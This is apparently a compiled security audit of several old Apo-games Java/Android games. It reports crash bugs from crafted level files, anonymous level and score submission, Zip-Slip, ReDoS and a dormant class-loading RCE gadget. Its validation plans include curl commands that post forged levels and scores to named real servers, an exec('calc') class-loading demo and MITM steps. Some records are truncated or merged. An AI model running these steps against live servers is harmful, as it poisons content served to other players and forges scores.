entry_point: The level string downloaded from get_level.php (stored via levels.add(str) in ApoSnakeUserlevelsLoad.java:184, copied into ApoSnakeLevel.editorLevels in ApoSnakeUserlevels.java:30). Reached when the player taps the 'userlevels' menu button: ApoSnakeMenu.java:76 -> ApoSnakePanel.setPuzzleGame (136-147) -> ApoSnakePuzzleGame.loadLevel (125-223). Also reached with locally edited strings, but the remote path requires no device access.
sink: new int[height][width] at line 161 and l.charAt(y * level[0].length + x + 2) at lines 167/195 - allocation size and string indices are computed directly from unvalidated bytes of the server line. Header chars < 96 yield negative dimensions; chars up to 0xFFFF yield dimensions up to ~65k x 65k; body length is never compared to width*height.
data_path: HTTP line -> ApoSnakeUserlevelsLoad.load() (11-line grouping; only the level line is attacker-arbitrary, metadata lines must be numeric or the load aborts safely) -> ApoSnakeUserlevels.sortByUpload()/getAllLevelsSorted() (ApoSnakeUserlevels.java:59-78, 44-57; built-in duplicates filtered by ApoSnakeLevel.isIn, everything else kept) -> ApoSnakeLevel.editorLevels[p[0]] (ApoSnakePuzzleGame.java:152) -> loadLevel() parse, executed on the render/think thread; no try/catch anywhere on this path.
attack_scenario: Attacker uploads (see ApoSnake-03, no account needed) or MITM-injects a level line such as "\u1000\u1000" + filler with numeric metadata around it. Every client listing that level allocates int[4000][4000] (~64 MB -> OutOfMemoryError on era-typical small Dalvik heaps) or, with a header like "AB", throws NegativeArraySizeException, or with a short body throws StringIndexOutOfBoundsException at line 167. The uncaught exception kills the game process; because levels are re-downloaded on every start, tapping 'userlevels' keeps crashing the app until the poison level disappears from the server.
preconditions: Attacker-controlled level string present in the get_level.php response (via upload endpoint or MITM from ApoSnake-01); player taps 'userlevels'. Metadata lines of the 11-line group must parse as numbers (Float/Integer.valueOf) or loadUserlevels()'s catch(Exception) (ApoSnakeUserlevels.java:34) aborts before editorLevels is set. Impact limited to process death/OOM - no evidence of memory corruption (Java arrays are bounds-checked), so no RCE.
validation_plan: Run a fake get_level.php (enabled via ApoSnake-01 setup) returning exactly 11 lines: line0='AB', lines1-3='0', line4='name', lines5-10='0'. Launch app, tap 'userlevels': logcat shows NegativeArraySizeException at ApoSnakePuzzleGame.java:161 and the process exits. Repeat with line0='zz'+short body -> StringIndexOutOfBoundsException at line 167; with line0 containing two '\u1000' chars -> OutOfMemoryError at line 161.

title: Unauthenticated, unsigned level upload endpoint lets anyone publish content pushed to all players
entry_point: In-game editor 'upload' button: ApoSnakeEditor.touchedButton (ApoSnakeEditor.java:186-196) -> uploadString() (227-234) -> ApoSnakeUserlevels.addLevel (ApoSnakeUserlevels.java:84-91) -> save(). Any HTTP client can hit save_level.php directly with the same one-parameter form body.
sink: POST http://www.apo-games.de/apoSn4ke/save_level.php (URL taken from ApoSnakeConstants.java:6) with body 'level=<arbitrary string>' - no authentication, no per-user identity, no signature, no client-side sanity limit beyond the editor UI's own 14x14 cap (ApoSnakeEditor.java:202,210), which a direct HTTP caller ignores entirely.
data_path: Editor grid -> getLevelString() (ApoSnakeEditor.java:240-257 builds '<w><h><cells>' from raw ints) -> addLevel() duplicate-check against already-downloaded levels only -> save() writes the string verbatim (only URLEncoder.encode applied) to the PHP script. The server's response is discarded; whatever was accepted later comes back to every client through get_level.php and feeds ApoSnake-02's parser.
attack_scenario: An attacker scripts curl --data 'level=<crafted payload>' against save_level.php (endpoint discoverable from any APK string table; the obfuscated path segment 'apoSn4ke' provides no secrecy). Poisoned levels persist server-side and are served to the whole player base on next fetch, enabling the remote-crash scenario of ApoSnake-02 or mass garbage-content injection, with no attribution or revocation mechanism in the protocol.
preconditions: save_level.php still live and accepting anonymous submissions (server-side condition outside this codebase); for the in-app path, device online and editor level test-solved (setLevelSolved, ApoSnakeEditor.java:70-76 gates the upload button).
validation_plan: From a PC: curl -d 'level=ABxxxxxxxxxxxxxxxxxxxxxx' http://www.apo-games.de/apoSn4ke/save_level.php, then curl -d 'Get=' http://www.apo-games.de/apoSn4ke/get_level.php and grep for the submitted string. If the service is dead, reproduce locally by pointing ApoSnakeConstants.java:5-6 at a stub PHP/Flask pair implementing the same contract and replaying the flow from the app.

title: Level-progression flag stored as plain int in SharedPreferences; trivially editable to unlock all levels

title: Zip-Slip path traversal in BitsZip.extract(): ZipEntry names used unsanitized as output paths
code_excerpt: final BufferedOutputStream out = new BufferedOutputStream(new FileOutputStream(new File(outDir,name)));
entry_point: Any zip archive passed as the zipFile argument of BitsZip.extract(String zipFile, String outDir); attacker controls every ZipEntry name (entry.getName() at line 75)
sink: new File(outDir, name) -> FileOutputStream at line 44 (also mkdirs at lines 77 and 86-88)

When a game variant extracts the pack, bytes are written outside outDir to any path the app UID can write: private files dir, shared_preferences XMLs (flip 'paid=true', alter saved progress), or the executable-adjacent data of the app. This persists tampering across restarts and can corrupt or forge other apps'-visible state on old, shared external storage.
preconditions: Within THIS repository there is no caller: grep shows BitsZip.extract is referenced nowhere except its own definition, so exploitation requires a sibling BitsEngine-based game variant that routes a downloaded/user-supplied zip (e.g. a level pack from the apo-games.de infrastructure present in other variants) into this public static API. title: Unescaped caller string concatenated into regex in BitsIO.findFile (crash / ReDoS)
code_excerpt: if( files[i].matches("(?i)^" + file + ".*$") == true ) { //will ignore the case; looks for
entry_point: The file parameter of BitsIO.findFile(String path, String file, boolean isPrefix) when isPrefix=true; if a sibling variant ever derives this argument from user content (level name, filename typed in UI, downloaded listing) it becomes attacker-controlled
sink: String.matches() compiles the concatenation '(?i)^'+file+'.*$' with java.util.regex.Pattern on the calling thread (game thread)
data_path: caller -> findFile() line 147 branch isPrefix==true -> line 148 files[i].matches("(?i)^" + file + ".*$") executed once per entry returned by f.list() at line 145, amplifying backtracking cost by directory size
attack_scenario: Two modes: (a) crash - a syntactically invalid pattern fragment such as 'a{{' throws PatternSyntaxException on every loop iteration, killing the game thread; (b) hang - a nested-quantifier pattern like '(a+)+$' matched against long filenames causes catastrophic backtracking, freezing the GL/logic thread (soft DoS). Both require no permissions beyond making findFile receive the crafted string.
preconditions: findFile has no caller inside this variant (grep across all 98 files shows none); it is engine API. Impact additionally requires a game variant to feed untrusted text into the prefix argument and a directory containing matching-length filenames.
validation_plan: Unit test on desktop JVM (same java.util.regex semantics): create temp dir with files 'aaaa...a' (200 chars x50 entries); call new BitsIO().findFile(dir, "(a+)+x", true) after relaxing visibility, measure wall time vs. benign prefix; then call with "a{{" and observe PatternSyntaxException stack trace originating at BitsIO.java:148.

title: Server-supplied level strings parsed by hand with substring()/Integer.valueOf() and no validation -> remotely triggerable crash
code_excerpt: this.level[y][x] = Integer.valueOf(levelString.substring(y * this.level[0].length + x + 4, y * this.level[0].length + x + 5));
entry_point: HTTP response lines from get_level.php stored in MyTreasureLevels.editorLevels; selected via MyTreasureLevelChooser.touchedReleased (MyTreasureLevelChooser.java:237-239) -> MyTreasurePanel.setGame(true,false,i,"") (MyTreasurePanel.java:283) -> MyTreasureGame.loadLevel
sink: Integer.valueOf(levelString.substring(...)) at MyTreasureGame.java:175-178 and 186, and array allocation new int[j*2][i] at line 180, all driven by attacker-controlled characters
data_path: loadLevel(false, i, "") -> bUserLevel branch (lines 139-151) sets levelString=editorLevels[level] -> gold/silver parsed from last 4 chars (175-176), width i and height j from first 4 chars (177-178), arrays sized (180), cells parsed char-by-char (183-191). preconditions: Attacker-controlled level string reaches editorLevels (via scripted anonymous upload to save_level.php or on-path HTTP tampering); victim browses user levels and opens the crafted one.
validation_plan: Two ways: (a) mitmproxy the get_level.php response so the first returned level line is '9999'; tap the first user level in-app; observe AndroidRuntime FATAL EXCEPTION StringIndexOutOfBoundsException in MyTreasureGame.loadLevel via adb logcat. title: Anonymous, unauthenticated level-submission protocol (no identity, signature, or rate limiting in client)
code_excerpt:
String content = "level=" + URLEncoder.encode(String.valueOf(level), "UTF-8");
				printout.writeBytes(content);
entry_point: Editor upload path: MyTreasureEditor.touchedButton(UPLOAD) -> upload() thread -> MyTreasureUserLevels.addLevel -> save(level)
sink: Cleartext POST body 'level=<string>' to http://www.apo-games.de/myTreasure/save_level.php (lines 149-163); the request carries no user id, device id, token, or MAC
data_path: The entire authentication/integrity surface is the single 'level=' parameter; the client performs no signing and the protocol offers no field that could identify the submitter, so the server-side DB contents are fully crowd-writable by construction (observable purely from client code).
attack_scenario: curl -d 'level=<anything>' http://www.apo-games.de/myTreasure/save_level.php inserts arbitrary records that are pushed to every client by get_level.php. This is the amplifier that makes findings 02 and 03 remotely exploitable without any network position: one scripted request poisons the shared catalog for all players. preconditions: Network access to apo-games.de; knowledge of the fixed endpoint URL hard-coded in MyTreasureConstants.java:13.
validation_plan: tcpdump/mitmproxy a legitimate in-game upload to capture the exact request shape; replay it with curl using an arbitrary level string; reopen the user-levels screen in the app and confirm the forged entry is listed and selectable (pair with the '9999' payload from finding 02 to demonstrate end-to-end impact).

Game accepts the level silently, then throws ArrayIndexOutOfBoundsException on first render; in applet mode this kills the applet, on desktop the game window stops functioning. Pure client-side crash, no privilege gain.
preconditions: Same as ApoBot-02: hostile .bot opened via in-game loader, swapped ./levels file, or MITM'd applet download.
validation_plan: Generate a minimal valid .bot (one 10x10 level, all GROUND_EMPTY) but overwrite the two start-point ints after the tile data with 0x000186A0 (100000). Load via gameLoad; confirm console ArrayIndexOutOfBoundsException originating at apoBot.ApoBotComponent.renderPlayer.

title: Single tile-height int from level file drives near-unbounded render loop (UI hang)
code_excerpt: for (int heightLevel = 0; heightLevel <= level.getLevel()[y][x].getHeight(); heightLevel++) {
entry_point: Per-tile 'height' int read unvalidated in ApoBotLevelIO.readLevel (apoBot/level/ApoBotLevelIO.java:82-84); ApoBotLevelLevel.setHeight only clamps negatives (apoBot/level/ApoBotLevelLevel.java:56-61), so any positive value up to 2^31-1 survives
sink: Render loops bounded by getHeight(): ApoBotImage.getIBackground (line 116, no culling inside loop, one g.drawImage per iteration) and ApoBotComponent.renderLevel (apoBot/ApoBotComponent.java:501)
data_path: .bot tile record -> ApoBotLevelLevel(ground,height) -> level stored via setLevel -> makeBackground() -> ApoBotImage.getIBackground iterates heightLevel 0..height for that tile, drawing each layer; with height=Integer.MAX_VALUE the loop runs ~2 billion drawImage calls, monopolizing the thread
attack_scenario: Attacker sets one tile's height field to 0x7FFFFFFF in a crafted .bot (or MITM response). On load, the game freezes indefinitely inside getIBackground (jstack shows the thread parked in the loop); user must kill the process. Client-side hang only, but 100% reliable and cheaper for the attacker than memory exhaustion.
preconditions: Hostile .bot reaches the parser (same channels as ApoBot-02). Editor-created levels cap height at 10 (ApoBotEditor.mouseClick, apoBot/game/ApoBotEditor.java:295-297), so only external files exhibit this.
validation_plan: Take a working .bot, patch the height int of tile [0][0] to 2000000000, load it, and observe the freeze; capture jstack showing the stuck frame in apoBot.ApoBotImage.getIBackground. Repeat with height=50000 to measure linear time growth, confirming loop-bound control.

title: Dormant URLClassLoader remote/local class-loading gadget with newInstance (no caller in this variant)
code_excerpt: url = new URL( this.getPath() ); ... URLClassLoader cl = new URLClassLoader( new URL[] { url } ); c = cl.loadClass( this.getClassname() ); return c.newInstance();
entry_point: Constructor arguments (path, classname) supplied by whoever instantiates ApoClassLoader; in applet mode the path is used directly as a URL (ApoClassLoader.java:68), otherwise as a File URI (line 66)
sink: Class.forName-equivalent cl.loadClass(...) followed by c.newInstance() executing the loaded class' no-arg constructor (org/apogames/help/ApoClassLoader.java:73-75)
data_path: new ApoClassLoader(path, classname).getMyClass() -> URLClassLoader over attacker-chosen URL/directory -> loadClass -> newInstance. CRITICAL CAVEAT: a full-text search of all 48 files in this variant finds ZERO callers of ApoClassLoader; the gadget is dead code inherited from the shared org.apogames framework.
attack_scenario: As shipped: none - the class is never referenced. If a sibling variant (or a future edit) wires it to server-controlled data (e.g., 'download extra levels/plugins'), an attacker controlling that URL hosts a .class whose constructor executes arbitrary code with the game's privileges (full user privileges for the desktop app; sandbox-limited for applets). Reported because this exact file is the corpus-wide propagation vector named in the study.
preconditions: Requires a call site instantiating ApoClassLoader with attacker-influenced path/classname - none exists in ApoBot today. Desktop execution additionally requires the victim to run the application (applet version would face the Java plugin sandbox unless signed).
validation_plan: Reproduce absence: rg -n "ApoClassLoader" over the tree returns only the definition file. Prove latent danger: compile a class Exploit{public Exploit(){Runtime.getRuntime().exec("calc")}} served from a local HTTP dir, then in a harness call new ApoClassLoader("http://127.0.0.1:8000/","Exploit").getMyClass() and observe execution - demonstrating that any future caller turns this into RCE.

title: Crafted .cheat level header triggers oversized/negative array allocation (heap exhaustion or uncaught crash)
entry_point: Any .cheat file the victim opens: (a) auto-loaded at startup from System.getProperty("user.dir")+/levels/Original1.cheat (ApoCheatingGamePanel.java:99), (b) picked via the HUD Load button -> JFileChooser -> ApoCheatingGamePanel.load(String) (ApoCheatingGamePanel.java:152-203), (c) next()/previous() navigation (ApoCheatingGamePanel.java:212-240)
sink: Allocation new int[y][x] where y and x are the first two raw ints of the file, executed BEFORE any of the y*x tile values are read
data_path: File bytes -> ObjectInputStream (ApoCheatingLoadSave.readLevel, line 368) -> in.readInt() x2 (lines 371-372) -> new int[y][x] (line 373). No bound, sign, or sanity check on either value.
attack_scenario: Attacker crafts a ~20 byte file in Java-serialization format (magic AC ED 00 05) followed by two ints. With y=65536, x=65536 the parser attempts a ~16 GB allocation and dies with OutOfMemoryError; with y=-1 it throws NegativeArraySizeException. Neither Error nor RuntimeException is caught (only IOException/EOFException, lines 479/484), so the game process terminates. Distributed as a 'level pack', or planted as levels/Original1.cheat in the working directory so it parses unattended at launch.
preconditions: Victim must open the malicious .cheat via the Load dialog, navigate onto it with next/previous, or have it placed at <user.dir>/levels/Original1.cheat before starting the game. File must begin with the ObjectInputStream magic header.
validation_plan: In jshell: 'var o=new ObjectOutputStream(new FileOutputStream("evil.cheat")); o.writeInt(65536); o.writeInt(65536); o.close()' (stream header written automatically). Copy to levels/Original1.cheat, run apoCheating.ApoCheatingMain. Expected: OutOfMemoryError ('Requested array size exceeds VM limit' or 'Java heap space') with ApoCheatingLoadSave.readLevel in the trace; repeat with writeInt(-1) twice for NegativeArraySizeException.

title: Unvalidated entity coordinates/tile indices from level file cause out-of-bounds array access and uncaught game crash
entry_point: goal/extra/player x,y,width,height doubles read verbatim from a .cheat file in ApoCheatingLoadSave.readLevel (e.g. lines 443-450, 457-462, 430-436), reaching the panel via ApoCheatingGamePanel.load() (lines 183-195)
sink: Direct indexing this.aPlayground[<file-derived int>][<file-derived int>] without checking against aPlayground.length / aPlayground[0].length
data_path: readLevel -> load() -> setHands() (first sink, lines 311-315: only guards are x-1>=0 and constant literals like x+1<15, never x<columnCount or y<rowCount; identical pattern for extras at lines 357-397) -> also setCoinDown() lines 594-605 (aWay[yValue][xValue]=false), movePlayer() line 690, and isThrowCoin() lines 562-564 during play
attack_scenario: Attacker takes a legitimate .cheat, changes one stored goal coordinate from e.g. 100.0 to 1000000.0 (plain DataOutputStream edit), and shares it. On load, setHands computes x=31250, the guard passes (x-1>=0), and aPlayground[y][x-1] throws ArrayIndexOutOfBoundsException. The exception propagates out of load() on the EDT/startup thread and kills the game. Same result in-game via player start coordinates (movePlayer/isThrowCoin).
preconditions: Same as ApoCheating-01: victim opens/plants the malicious level file. Binary layout is fixed and fully documented by writeLevel() (ApoCheatingLoadSave.java:205-343), making targeted edits trivial.
validation_plan: Write a valid minimal level with ApoCheatingLoadSave.writeLevel(), then rewrite only the first goal x-coordinate as 1000000 (double at its recorded offset). Open it via the Load button. Expected: ArrayIndexOutOfBoundsException at ApoCheatingGamePanel.setHands, game window dead/closed; confirm same with a player x of 1e9 hitting movePlayer after pressing Play.

title: ObjectInputStream wrapped over untrusted level files establishes a latent deserialization sink (no readObject today)
code_excerpt:
FileInputStream file		= new FileInputStream( fileName );
ObjectInputStream in 		= new ObjectInputStream( file );
entry_point: The same user-supplied .cheat files as ApoCheating-01/02 (startup auto-load ApoCheatingGamePanel.java:99, Load dialog, next/previous)
sink: ObjectInputStream construction over attacker-chosen bytes (also hasNextLevel(), line 350). Currently ONLY primitive reads occur: readInt/readDouble/readBoolean/readUTF (lines 371-477); grep confirms zero readObject() calls in the whole variant.
data_path: File -> FileInputStream -> ObjectInputStream (line 368). Because no readObject() is ever invoked, no instantiation of attacker-nominated classes happens today; the type-resolving machinery is nonetheless wired to untrusted input.
attack_scenario: Theoretical: if a maintainer (or a cloned sibling variant reusing this LoadSave skeleton) later stores richer objects and calls in.readObject() - the natural next step given the stream is already an ObjectInputStream - any class on the game's classpath becomes a gadget candidate for remote code execution via a booby-trapped level file. Today the worst an attacker gets is the crash paths in ApoCheating-01/02.
preconditions: Requires a future/cloned code change introducing readObject(); not exploitable as shipped.
validation_plan: Confirm absence mechanically: rg 'readObject' over the tree returns no hits, while ObjectInputStream appears at lines 15, 350, 368 of ApoCheatingLoadSave.java. To demonstrate the latent hazard, append a call to in.readObject() in a test copy and feed a serialized java.util.HashMap containing a common gadget payload - it would instantiate - then revert; this documents why the wrapper choice matters for clone propagation.

title: Dead-code ApoClassLoader loads and instantiates classes from arbitrary file paths or URLs
code_excerpt: URLClassLoader cl = new URLClassLoader( new URL[] { url } ); ... c = cl.loadClass( this.getClassname() ); ... return c.newInstance();
entry_point: None in this variant. Constructor takes (path, classname); in applet mode (ApoConstants.B_APPLET == true, set by apoCommando/ApoMarioApplet.java:26) the path is used directly as a URL (line 68); otherwise as a local directory/jar path (line 66).
sink: cl.loadClass(...).newInstance() at lines 73-75: arbitrary bytecode is defined, initialized, and its no-arg constructor executed.
data_path: getMyClass() -> new URL(path) [applet] or new File(path).toURI().toURL() [desktop] -> URLClassLoader -> loadClass(classname) -> newInstance(). Verified unreachable: repo-wide grep for 'ApoClassLoader|getMyClass|Class.forName|newInstance' outside the definition returns zero hits; the only instantiations of game classes (ApoMarioMain.java:34-38, ApoMarioApplet.java:41-46) hardcode ApoMarioPanel.
attack_scenario: Theoretical in this build: if a future edit or sibling-variant wiring calls new ApoClassLoader(url, 'evil.Evil').getMyClass(), any party controlling that URL (or a local user pointing it at a crafted directory) gets immediate constructor execution inside the game JVM. As shipped, no attacker-reachable path exists.
preconditions: Some code must first be modified to invoke ApoClassLoader with an attacker-controlled path/classname (in sibling variants that use plugin-style loading this precondition may already hold - compare before scoring this variant).
validation_plan: Compile the tree, then run a driver: new ApoClassLoader("http://127.0.0.1:8080/", "Evil").getMyClass(); with Evil.class (static block printing 'PWNED') served by python3 -m http.server 8080, after setting ApoConstants.B_APPLET=true. Observable result: 'PWNED' printed by the constructor proves the sink fires once a caller exists. Then confirm absence as shipped by showing javac -Xlint and a grep audit find no call sites.

title: ApoIO level read/write uses plain HTTP (no TLS, no integrity check) in applet mode; machinery present but unwired
code_excerpt: URL connectionURL = new URL(fileName); HttpURLConnection connection = (HttpURLConnection)connectionURL.openConnection(); connection.setDoOutput(true); data = new DataOutputStream(connection.getOutputStream());
entry_point: readLevel(String)/writeLevel(String) (lines 31, 67). When B_APPLET==false fileName is a filesystem path (FileInputStream/FileOutputStream lines 36, 79); when true it is treated as a URL: writeLevel POSTs the level bytes to it (lines 40-43) and readLevel does connection.openStream() (lines 83-84).
sink: Unauthenticated cleartext HTTP GET/POST to whatever host is embedded in fileName; response bytes flow into the abstract readLevel(DataInputStream) parser (line 87).
data_path: Caller-supplied fileName string -> new URL(fileName) -> HttpURLConnection/openStream -> DataInputStream -> abstract parse. Verified unreachable in THIS variant: nothing extends ApoIO and grep for 'readLevel|writeLevel|DataInputStream|DataOutputStream' under apoCommando/ returns zero hits; levels come only from hardcoded ApoMarioMyLevels.LEVEL_STRINGS (apoCommando/level/ApoMarioMyLevels.java:8-11) matched in apoCommando/panels/ApoMarioModel.java:239-262 and apoCommando/level/ApoMarioLevel.java:207-253.
attack_scenario: Theoretical here: were the applet wired like sibling variants (e.g., fetching get_level.php / posting save_highscore.php over http://), a MITM on the player's LAN could tamper with downloaded level bytes (parsed by hand with no schema check downstream) and forge submitted scores. As shipped, there is no call site, so no network traffic occurs at all.
preconditions: Game running as signed applet (B_APPLET=true) AND a code change that subclasses ApoIO and passes an http:// fileName; additionally the abstract parser would need to tolerate attacker-chosen byte streams.
validation_plan: (1) Prove the sink works: write a test subclass implementing readLevel(DataOutputStream)/readLevel(DataInputStream), run against a local netcat listener: java -cp . Test write http://127.0.0.1:9999/lvl -> observe plaintext POST body in nc (confirms no TLS/no signing); serve bytes from nc and observe them reaching the parser. (2) Prove absence as shipped: grep -rn 'extends ApoIO' and 'readLevel(' across all 72 files returns only the definitions in ApoIO.java itself.

title: MD5 helper (MessageDigest.getInstance("MD5")) in shared ApoHelp, unused in this variant
code_excerpt: MessageDigest lDigest = MessageDigest.getInstance("MD5"); lDigest.update(pInput.getBytes()); BigInteger lHashInt = new BigInteger(1, lDigest.digest()); return String.format("%1$032X", lHashInt);
entry_point: Static method ApoHelp.getMd5Digest(String pInput) (line 305). No entry point exists: grep across the whole variant finds the single definition and zero callers.
sink: MD5 digest computation intended (per corpus pattern) for score/validation tokens; collision-prone and unkeyed, so any future integrity check built on it is forgeable by construction.
data_path: In this build: none - dead code. In sibling variants that call it around highscore submission, the data path is typically playerName+score -> getMd5Digest -> token sent alongside the score over plain HTTP, trivially recomputed by an attacker.
attack_scenario: Theoretical here: a local player who wants to cheat needs nothing this function provides (achievements live only in memory, see ApoMarioAchievements.java:46-65; no scores leave the machine). If a future edit adds score validation using this helper, both attacker-forgery (choose colliding input) and simple recompute-the-hash forgery apply.
preconditions: Someone must first wire getMd5Digest into a validation/submission path (as some sibling variants reportedly do).
validation_plan: (1) Show the weakness generically: call ApoHelp.getMd5Digest on two known MD5 colliding blocks (e.g., the Daum-Luty 128-byte pair) and print identical output. (2) Show non-use as shipped: compile with a stub that throws from getMd5Digest and run the game normally (java apoCommando.ApoMarioMain, play a level, type commands in the DOS console) - no exception, confirming the code never executes.

title: Hand-rolled XML highscore parser consumes unauthenticated plain-HTTP response: client DoS and on-screen content spoofing
code_excerpt: is = connection.openStream(); ... this.makeEntity(new Scanner(is).useDelimiter("\\Z").next());
entry_point: HTTP GET response body of http://daporius.drition.net/highscore.xml (fetched at line 81-83, plain HTTP, no signature/validation), pulled every time a game ends when canConnect() && main.isOriginal() (ApoDefenceGame.java:400-405 and 426-431)
sink: makeEntity(String) lines 95-115: indexOf/substring slicing plus Integer.parseInt (lines 102-103, 108-109); results rendered via ApoDefenceHighscoreEntity.render -> Graphics.drawString (ApoDefenceHighscoreEntity.java:57-69)
data_path: URL.openStream() (line 83) -> Scanner(useDelimiter "\\Z").next() slurps whole body (line 87) -> private makeEntity(String) strips \t/\n then loops on <person>/<nickname>/<level>/<map>/<point> markers -> addEntity(name,map,level,points) -> render() draws attacker strings on the win/lose screen
attack_scenario: Attacker controls daporius.drition.net DNS/host or sits on-path (cleartext HTTP, so any LAN/WiFi/gateway MITM works): (a) serve '<person><nickname>a</nickname><level>zzz</level>' -> Integer.parseInt('zzz') throws NumberFormatException, or '<person>' with no '</person>' -> substring(idx,-1) throws StringIndexOutOfBoundsException; the exception escapes think() (ApoDefenceGame.java:405/431) into ApoDefenceTimer.run(), killing the java.util.Timer thread -> game freezes. (b) serve well-formed rows with nickname 'PWNED' mapped to the victim's current map -> fake leaderboard rows are painted, highlighted red as the player's own placement.
preconditions: Player finishes a map (win or loss) with default/original option settings (isOriginal(), ApoDefenceOptions.java:81-88) and canConnect()'s plain-HTTP probe of http://home.arcor.de/newbielein/test.gif succeeds (line 63-64) - trivially true for a MITM who serves any decodable GIF. Endpoints appear long-dead, so in practice the attacker must be on-path or control DNS.
validation_plan: Add '127.0.0.1 daporius.drition.net' to /etc/hosts, run python3 -m http.server 80 serving highscore.xml containing '<person><nickname>x</nickname><level>NaN</level></person>'; play Original_First until win/loss screen; observed result: NumberFormatException stack trace and permanently frozen game loop (timer thread dead). Repeat with valid XML using nickname PWNED/map Original_First to confirm spoofed red-highlighted leaderboard row renders.

title: Score submission over cleartext HTTP where the only 'protection' is iterated Base64 (Base64Coder misnamed Encrypt) plus a day-of-month check
code_excerpt: String url = "http://daporius.drition.net/highscore.php?"; String getUrl = "name=" + baseName + "&map=" + baseMap + "&level=" + baseLevel + "&points=" + basePoints + "&cor=" + day;
entry_point: ApoDefenceGame.mouseReleased 'Upload' button handler (ApoDefenceGame.java:775-783) sends nicknameField.getText(), level name from the loaded .defence file, waves and points - all client-controlled
sink: HttpURLConnection GET to http://daporius.drition.net/highscore.php (lines 198-203), accepted server-side as a score entry
data_path: send(name,map,level,points) (166) -> ApoDefenceHighscoreEncrypt.encodeString applied 3x to name, 4x to map, 2x to level/points/day (168-189) - ApoDefenceHighscoreEncrypt.java:61-63 is verbatim public-domain Base64Coder (comment lines 4-8), zero cryptography - concatenated into URL (191-195) -> con.getInputStream() (203)
attack_scenario: (1) Forgery without playing: anyone computes the encoding offline (e.g. points=999999 quintuple-Base64) and curls the URL - the 'cor' parameter is just double-Base64 of the day-of-month, guessable forever. (2) On-path tampering: because it is cleartext HTTP, a MITM rewrites the points parameter in flight. (3) Gate bypass: the only client-side guard is isOriginal() (ApoDefenceOptions.java:81-88), which compares live settings to money/towerCount/waves read back from the user-editable .defence file itself (ApoDefenceOptionsGeneral.java:148-166), so crafting a level file with generous values makes 'original' true. Amplifier: the map value sent is the level FILE NAME (loadSave.getLevel(), ApoDefenceGame.java:777; ApoDefenceLoadSave.java:154) taken unsanitized from disk, so a distributed level named 'X&points=<forged>&...' injects parameters into the GET.
preconditions: For forgery: nothing but network access to the (historical) endpoint; for MITM: position on path; for the gate: ability to hand the victim a crafted .defence level or edit their own.
validation_plan: Replicate encoding in python: b64(b64(b64('Cheater')))=name, b64^4('Original_First')=map, b64^2('40')=level, b64^5('999999')=points, b64^2(str(datetime.day))=cor; curl 'http://daporius.drition.net/highscore.php?name=..&map=..&..' while tcpdump shows the plaintext request; if the server were resurrected, re-fetching highscore.xml would list Cheater/999999. Offline proof: decode any captured legitimate request with 5x base64-decode to recover exact fields.

title: Level-file header ints drive unbounded allocations (new int[y][x], BufferedImage(x*32,y*32), count-driven object loops)
code_excerpt: this.x = data.readInt(); this.y = data.readInt(); this.aPlayground = new int[this.y][this.x];
entry_point: .defence binary level file: chosen via JFileChooser (ApoDefenceGame.setLoad, ApoDefenceGame.java:347-370, opened from Options->Load, ApoDefenceOptions.java:170-172; editor equivalent ApoDefenceEditorGame.java:306-335), or auto-loaded levels/Original_First.defence at startup (ApoDefenceGame.java:176) - i.e., any downloadable/shared user level
sink: new int[this.y][this.x] (line 159); downstream new BufferedImage(this.x * 32, this.y * 32,...) (ApoDefenceGame.makeNewXAndY, ApoDefenceGame.java:225); unbounded count loops: enemyWay size (line 177-183) and enemies size (lines 192-196) allocate one object per declared int with no cap
data_path: readLevel(fileName) (145) -> raw DataInputStream.readInt x2 (156-157) straight into array dimensions; no upper bound, no sanity check vs file length; negative values yield NegativeArraySizeException, huge values OutOfMemoryError; neither is IOException so they propagate uncaught through setLoad to the caller
attack_scenario: Attacker distributes an attractive 'custom map' .defence whose first 8 bytes are 0x3B9AC9FF twice (or simply 2000000000/-1): victim opens it via Load -> immediate NegativeArraySizeException/OOME crash; a subtler file (e.g. 60000x60000) passes int[] allocation attempts and dies allocating the 1.92M-pixel-x32 BufferedImage, or declares enemyWay size 0x7FFFFFFF so the loop at 177-183 exhausts heap from a ~30-byte file.
preconditions: Victim loads the attacker-supplied .defence file (classic malicious-user-content path for this genre); no other conditions.
validation_plan: Write a file: bytes 0-7 big-endian 1000000000,1000000000, append junk, save as evil.defence; launch game, Options->Load, select evil.defence; observed result: NegativeArraySizeException (negative variant) or OutOfMemoryError (large variant) with ApoDefenceLoadSave.readLevel in the trace. Second file with enemyWay-size field 0x7FFFFFFF confirms heap exhaustion from a tiny file.

title: UTF string from level file used as classpath resource name for underground image - reliable crash, but no filesystem traversal
code_excerpt: img = ImageIO.read( ApoDefenceImage.class.getResource( BildName ) );
entry_point: imageString field (DataInputStream.readUTF) of a user-supplied .defence level file (ApoDefenceLoadSave.java:185)
sink: ApoDefenceImage.getPic -> getImage: Class.getResource(BildName) then ImageIO.read(...) (lines 63-110); dereferenced without null check at img.getWidth() line 108
data_path: readLevel readUTF (ApoDefenceLoadSave.java:185) -> getLoadSave().getImageString() -> ApoDefenceGame.restart() lines 1069-1073 (this.image.getPic(this.imageString,false)); editor twin at ApoDefenceEditorGame.java:325-329 -> getResource resolves against classloader roots only; missing resource returns null -> ImageIO.read(null) throws IllegalArgumentException (only IOException is caught at line 104), or NPE at line 108
attack_scenario: Craft a .defence with imageString '/images/nope.png': on load the game throws IllegalArgumentException/NPE during restart() and dies - a second crash vector bundled with the same malicious-level distribution as ApoDefence-03. IMPORTANT negative result: '../../etc/passwd' style values do NOT escape the classpath (getResource never resolves arbitrary filesystem/remote paths here), so this is not a file-disclosure bug; marking that angle explicitly unreachable/theoretical.

validation_plan: Take a working Original_First.defence, locate the writeUTF imageString segment ('/images/underground.png' visible as readable string), replace with '/images/zz.png' keeping lengths consistent; open via Load; observed result: IllegalArgumentException ('input == null!') or NPE at ApoDefenceImage.java:108 immediately after selection. Try '../../../etc/passwd' to confirm it also merely crashes (null resource), proving no traversal.

title: All game-server traffic (highscore + achievements cookie) sent over plain HTTP
code_excerpt:
public final static String HIGHSCORE_GETPHP = "http://www.apo-games.de/apoIcarus/get_highscore.php";
public final static String HIGHSCORE_SAVEPHP = "http://www.apo-games.de/apoIcarus/save_highscore.php";
entry_point: Player selects 'highscore' menu or finishes a run; also applet achievement sync. Endpoints hard-coded at ApoConstants.java:24-25 and apoJump/ApoJumpConstants.java:8 (PROGRAM_URL).
sink: url.openConnection() in ApoHighscore.save/load (org/apogames/help/ApoHighscore.java:63 and :109) and ApoHelp.saveData/loadData (org/apogames/help/ApoHelp.java:424 and :452, 'cookies.php')
